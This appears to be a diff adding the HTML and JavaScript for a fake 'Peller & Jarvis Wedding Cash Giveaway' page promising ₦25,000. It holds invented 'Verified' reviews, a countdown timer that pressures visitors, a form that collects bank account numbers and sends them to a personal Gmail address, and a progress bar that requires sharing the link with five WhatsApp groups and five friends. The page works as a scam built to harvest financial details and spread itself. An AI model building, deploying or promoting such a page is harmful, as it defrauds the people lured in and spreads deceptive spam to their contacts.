@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="stylesheet" href="style.css">
+  <title>Document</title>
+  <style>
+    
+
+  </style>
+</head>
+<body>
+  <header class="hero">
+  <h2>Peller & Jarvis Wedding Cash Giveaway</h2>
+  <p class="more">
+    Officially approved by peller and jarvis. Register now before August 1, 2026
+  </p>
+  <button class="btn">
+    REGISTER FOR ₦25,000
+  </button>
+  </header>
+   <div class="ticker">
+   <p> PELLER AND JARVIS WEDDING CELEBRATION CASH GIVEAWAY  </p>
+   </div>
+   <div class="chidinma">
+     <p>Join Us As We Celebrate Their 2026 Wedding </p>
+     <p class="c"> ₦25,000 Cash Giveaway </p>
+   </div>
+   <div class="stamp">
+     <h2>
+       REGISTRATION ENDS IN
+     </h2>
+     <p>
+       Deadline : August 1, 2026
+     </p>
+     <div class="flex">
+       <button class="joy"> <span id="days">00</span> <br>DAYS</button>
+       <button class="joy"><span id="hours">00</span> <br>
+         HOURS</button>
+       <button class="joy"><span id="minutes">00</span> <br>
+         MINUTES</button>
+       <button class="joy"><span id="seconds">00</span> <br>
+         SECONDS</button>
+       
+     </div>
+   </div>
+   <div class="node">
+     <div>
+     <button class="nodebtn">1.Register</button>
+     <button class="nodebtn">2.Verify</button>
+     <button class="nodebtn">3.Share</button>
+     <button class="nodebtn">4.Complete</button>
+     </div>
+   </div>
+   <div class="body">
+<div class="container">
+
+<h1>Participants Reviews</h1>
+
+<!-- Permanent Reviews -->
+
+<div class="review">
+<div class="avatar">D</div>
+<div class="content">
+<h3>Daniel A. <span class="badge">Verified </span></h3>
+<div class="stars">★★★★★</div>
+<p>Goodluck to everyone participatong in the ₦25,000 cash giveaway</p>
+<div class="date">30 June 2026</div>
+</div>
+</div>
+
+<div class="review">
+<div class="avatar">G</div>
+<div class="content">
+<h3>Grace M. <span class="badge">Verified </span></h3>
+<div class="stars">★★★★★</div>
+<p>I have Completethe steps and submitted my details successfully</p>
+<div class="date">29 June 2026</div>
+</div>
+</div>
+
+<div class="review">
+<div class="avatar">S</div>
+<div class="content">
+<h3>Samuel T. <span class="badge">Verified </span></h3>
+<div class="stars">★★★★★</div>
+<p>Congratulations to Peller and Jarvis.  This is a beautiful celebration</p>
+<div class="date">28 June 2026</div>
+</div>
+</div>
+
+<div class="review">
+<div class="avatar">E</div>
+<div class="content">
+<h3>Esther O. <span class="badge">Verified </span></h3>
+<div class="stars">★★★★★</div>
+<p>I just completed my ₦25,000 cash giveaway registration. Wairing for the next update</p>
+<div class="date">25 June 2026</div>
+</div>
+</div>
+
+<div class="review">
+<div class="avatar">V</div>
+<div class="content">
+<h3>Victor E. <span class="badge">Verified </span></h3>
+<div class="stars">★★★★★</div>
+<p>i have completed my registration hope i get selected </p>
+<div class="date">30 June 2026</div>
+</div>
+</div>
+
+<hr>
+
+<h2>Write A Comment</h2>
+
+<input type="text" id="name" placeholder="Your Name">
+
+<textarea id="comment" placeholder="Write your review..."></textarea>
+
+<button class="nnn" onclick="postReview()">Post Comment</button>
+
+<div id="myReview"></div>
+
+</div>
+</div>
+
+<div class="order-page">
+
+<div class="order-card">
+
+<h2 class="order-title">Registration Form</h2>
+
+<form class="order-form" onsubmit="submitOrderEmail(); return false;">
+
+<label class="order-label">Full Name</label>
+<input class="order-input" type="text" id="orderName" placeholder="OPTIONAL">
+
+<label class="order-label">Account Number</label>
+<input class="order-input" type="tel" id="orderPhone" required>
+
+<label class="order-label">Select Bank</label>
+
+<select class="order-select" id="orderProduct">
+<option>Opay</option>
+<option>Palmpay</option>
+<option>Moniepoint</option>
+<option>Kuda</option>
+</select>
+
+<label class="order-label">Type Yes To Verify</label>
+
+<textarea class="order-textarea" id="orderAddress"></textarea>
+
+<button class="order-button" type="submit">
+Register Now
+</button>
+
+</form>
+
+</div>
+
+</div>
+
+<div class="referral-box">
+
+<h2>🎁 Share With Friends To Complete Registration</h2>
+
+<p>Share our website with at least 5 WhatsApp groups and 5 friends to complete registration. After sharing, click <b>I've Shared</b> to update your progress.</p>
+
+<div class="progress-bar">
+
+<div id="progressFill" class="progress-fill"></div>
+
+</div>
+
+<p id="progressText">0% Complete</p>
+
+<button class="share-btn" onclick="shareWhatsApp()">
+Share on WhatsApp
+</button>
+
+<button class="confirm-btn" onclick="confirmShare()">
+I've Shared
+</button>
+
+</div>
+
+<script>
+
+function postReview(){
+
+let name=document.getElementById("name").value.trim();
+
+let comment=document.getElementById("comment").value.trim();
+
+if(name===""||comment===""){
+
+alert("Please fill in all fields.");
+
+return;
+
+}
+
+let review=`
+
+<div class="review">
+
+<div class="avatar">${name.charAt(0).toUpperCase()}</div>
+
+<div class="content">
+
+<h3>${name}</h3>
+
+<div class="stars">★★★★★</div>
+
+<p>${comment}</p>
+
+<div class="date">Just now</div>
+
+</div>
+
+</div>
+
+`;
+
+document.getElementById("myReview").innerHTML=review;
+
+document.getElementById("name").value="";
+
+document.getElementById("comment").value="";
+
+}
+
+
+function submitOrderEmail(){
+
+let customerName=document.getElementById("orderName").value;
+
+let customerPhone=document.getElementById("orderPhone").value;
+
+let selectedProduct=document.getElementById("orderProduct").value;
+
+let customerAddress=document.getElementById("orderAddress").value;
+
+let subject="New Customer Order";
+
+let emailBody=
+"Customer Name: "+customerName+
+"%0D%0A%0D%0A"+
+"Phone Number: "+customerPhone+
+"%0D%0A%0D%0A"+
+"Product: "+selectedProduct+
+"%0D%0A%0D%0A"+
+"Delivery Address: "+customerAddress;
+
+window.location.href=
+"mailto:igboanugoakachukwu41@gmail.com?subject="+subject+"&body="+emailBody;
+}
+// Set the deadline
+const deadline = new Date("August 1, 2026 00:00:00").getTime();
+
+function updateCountdown() {
+
+    const now = new Date().getTime();
+
+    const distance = deadline - now;
+
+    if (distance <= 0) {
+
+        document.getElementById("days").textContent = "00";
+        document.getElementById("hours").textContent = "00";
+        document.getElementById("minutes").textContent = "00";
+        document.getElementById("seconds").textContent = "00";
+
+        clearInterval(timer);
+
+        return;
+    }
+
+    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+
+    const hours = Math.floor(
+        (distance % (1000 * 60 * 60 * 24))
+        / (1000 * 60 * 60)
+    );
+
+    const minutes = Math.floor(
+        (distance % (1000 * 60 * 60))
+        / (1000 * 60)
+    );
+
+    const seconds = Math.floor(
+        (distance % (1000 * 60))
+        / 1000
+    );
+
+    document.getElementById("days").textContent =
+        String(days).padStart(2, "0");
+
+    document.getElementById("hours").textContent =
+        String(hours).padStart(2, "0");
+
+    document.getElementById("minutes").textContent =
+        String(minutes).padStart(2, "0");
+
+    document.getElementById("seconds").textContent =
+        String(seconds).padStart(2, "0");
+
+}
+
+updateCountdown();
+
+const timer = setInterval(updateCountdown, 1000);
+
+const steps = [40,20,10,10,5,5,5,5];
+
+let progress =
+Number(localStorage.getItem("progress")) || 0;
+
+let stepIndex =
+Number(localStorage.getItem("stepIndex")) || 0;
+
+updateBar();
+
+function shareWhatsApp(){
+
+const text =
+encodeURIComponent(
+"Peller and Jarvis wedding celebration offer! click on this link to get yours now https://yourwebsite.com"
+);
+
+window.open(
+"https://api.whatsapp.com/send?text="+text,
+"_blank"
+);
+
+}
+
+function confirmShare(){
+
+if(stepIndex >= steps.length){
+
+alert("Congratulations! You have reached 100%.");
+
+return;
+
+}
+
+progress += steps[stepIndex];
+
+if(progress > 100){
+
+progress = 100;
+
+}
+
+stepIndex++;
+
+localStorage.setItem("progress",progress);
+
+localStorage.setItem("stepIndex",stepIndex);
+
+updateBar();
+
+}
+
+function updateBar(){
+
+document.getElementById("progressFill").style.width =
+progress + "%";
+
+document.getElementById("progressText").innerHTML =
+progress + "% Complete";
+
+}
+
+</script>
+
+</body>
+  </html>
